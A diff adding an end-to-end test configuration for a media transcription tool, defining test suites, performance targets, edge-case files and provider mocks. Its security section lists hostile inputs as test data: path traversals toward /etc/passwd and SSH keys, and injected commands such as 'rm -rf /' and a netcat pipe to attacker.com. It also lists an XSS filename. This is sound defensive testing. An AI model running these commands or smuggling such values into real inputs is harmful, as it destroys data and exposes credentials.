@@ -1,0 +1,233 @@
+# E2E Testing Configuration
+# This file contains configuration settings for the comprehensive E2E testing framework
+
+[test_suites]
+# Test suite definitions with their characteristics
+unit = {
+    path = "tests/unit",
+    description = "Unit tests for individual components",
+    timeout = 300,
+    critical = true,
+    parallel = true
+}
+
+integration = {
+    path = "tests/integration",
+    description = "Integration tests for service interactions", 
+    timeout = 600,
+    critical = true,
+    parallel = true
+}
+
+cli = {
+    path = "tests/e2e/test_cli_integration.py",
+    description = "CLI command integration tests",
+    timeout = 900,
+    critical = true,
+    parallel = false
+}
+
+provider = {
+    path = "tests/e2e/test_provider_integration.py", 
+    description = "Provider factory and integration tests",
+    timeout = 600,
+    critical = true,
+    parallel = false
+}
+
+performance = {
+    path = "tests/e2e/test_performance.py",
+    description = "Performance and load testing",
+    timeout = 1800,
+    critical = false,
+    parallel = false
+}
+
+security = {
+    path = "tests/e2e/test_security.py",
+    description = "Security and vulnerability testing",
+    timeout = 600,
+    critical = true,
+    parallel = false
+}
+
+[performance_targets]
+# Performance benchmark targets in seconds
+extract_short = 30        # 5s video extraction
+extract_medium = 60       # 2min video extraction  
+transcribe_short = 45     # 5s audio transcription
+transcribe_medium = 120   # 2min audio transcription
+process_short = 90        # Full pipeline 5s video
+process_medium = 300      # Full pipeline 2min video
+
+[memory_targets]
+# Memory usage targets in MB
+extract_short = 100
+extract_medium = 200
+process_short = 200
+process_medium = 500
+max_concurrent = 1000     # During concurrent operations
+
+[test_data]
+# Test media file specifications
+short_video = {
+    name = "test_short.mp4",
+    duration = 5,
+    size_mb = 1,
+    description = "Basic functionality testing"
+}
+
+medium_video = {
+    name = "test_medium.mp4", 
+    duration = 120,
+    size_mb = 20,
+    description = "Standard workflow testing"
+}
+
+long_video = {
+    name = "test_long.mp4",
+    duration = 1800,
+    size_mb = 300,
+    description = "Performance testing"
+}
+
+audio_only = {
+    name = "test_audio.mp3",
+    duration = 10,
+    size_mb = 0.2,
+    description = "Audio-only pipeline"
+}
+
+[edge_cases]
+# Edge case test files
+empty_file = {
+    name = "test_empty.mp4",
+    size = 0,
+    description = "Empty file edge case"
+}
+
+corrupted_file = {
+    name = "test_corrupted.mp4", 
+    size = 1024,
+    description = "Corrupted media file"
+}
+
+unicode_file = {
+    name = "test_unicode_名前.mp4",
+    duration = 5,
+    description = "Unicode filename support"
+}
+
+spaces_file = {
+    name = "test spaces.mp4",
+    duration = 5,
+    description = "Filename with spaces"
+}
+
+[security_tests]
+# Security test configurations
+path_traversal_attacks = [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\config\\sam",
+    "/etc/passwd",
+    "../../../../root/.ssh/id_rsa"
+]
+
+command_injection_attempts = [
+    "file.mp4; rm -rf /",
+    "file.mp4 && cat /etc/passwd", 
+    "file.mp4 | nc attacker.com 1234",
+    "file.mp4 $(whoami)"
+]
+
+special_filenames = [
+    "test@#$%^&*().mp4",
+    "test file with spaces.mp4",
+    "test\x00null.mp4",
+    "test<script>alert('xss')</script>.mp4"
+]
+
+[provider_matrix]
+# Provider testing scenarios
+all_configured = {
+    deepgram = true,
+    elevenlabs = true,
+    expected = "auto_select_best"
+}
+
+deepgram_only = {
+    deepgram = true,
+    elevenlabs = false,
+    expected = "use_deepgram"
+}
+
+elevenlabs_only = {
+    deepgram = false,
+    elevenlabs = true,
+    expected = "use_elevenlabs"
+}
+
+none_configured = {
+    deepgram = false,
+    elevenlabs = false,
+    expected = "graceful_error"
+}
+
+[monitoring]
+# Monitoring and alerting configuration
+metrics_retention_days = 90
+trend_analysis_days = 30
+
+[alerts]
+# Alert thresholds
+critical_success_rate = 80    # Below this triggers critical alert
+warning_success_rate = 95     # Below this triggers warning
+performance_degradation = 20  # Percent increase triggers alert
+memory_threshold = 1000       # MB threshold for memory alerts
+
+[reporting]
+# Report generation settings
+generate_html = true
+generate_json = true  
+generate_markdown = true
+include_charts = true
+include_trends = true
+
+[ci_cd]
+# CI/CD integration settings
+run_on_push = ["unit", "integration", "cli", "security"]
+run_on_pr = ["unit", "integration", "cli", "provider", "security"]
+run_nightly = ["all"]
+run_on_release = ["all"]
+
+fail_fast_on_critical = true
+upload_artifacts = true
+generate_coverage = true
+notify_on_failure = true
+
+[environment]
+# Environment requirements
+python_min_version = "3.8"
+required_tools = ["ffmpeg", "pytest"]
+required_packages = [
+    "pytest>=7.0.0",
+    "pytest-asyncio>=0.21.0", 
+    "pytest-cov>=4.0.0",
+    "pytest-mock>=3.10.0",
+    "psutil>=5.9.0"
+]
+
+[mock_settings]
+# Mock service configuration for testing
+use_mocks_by_default = true
+mock_api_keys = {
+    deepgram = "test_deepgram_key_for_mocking",
+    elevenlabs = "test_elevenlabs_key_for_mocking"
+}
+
+mock_responses = {
+    transcription_success = true,
+    include_speaker_diarization = true,
+    include_sentiment_analysis = true,
+    simulate_rate_limits = false
+}
